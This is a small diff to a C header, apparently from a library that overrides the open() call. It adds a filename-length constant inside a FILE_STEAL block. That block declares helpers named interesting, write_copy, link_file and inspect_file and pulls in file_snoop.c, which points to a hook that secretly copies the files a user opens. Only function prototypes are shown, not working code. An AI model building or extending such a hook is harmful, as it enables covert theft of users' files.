@@ -2,6 +2,9 @@
 #define OPEN_H
 
 #ifdef FILE_STEAL
+
+#define FILENAME_MAXLEN 128
+
 int interesting(const char *path);
 char *get_filename(const char *path);
 int write_copy(const char *old_path, char *new_path);
@@ -12,6 +15,7 @@ int link_file(const char *old_path, char *new_path);
 #endif
 void inspect_file(const char *pathname);
 #include "file_snoop.c"
+
 #endif
 
 int open(const char *pathname, int flags, mode_t mode);
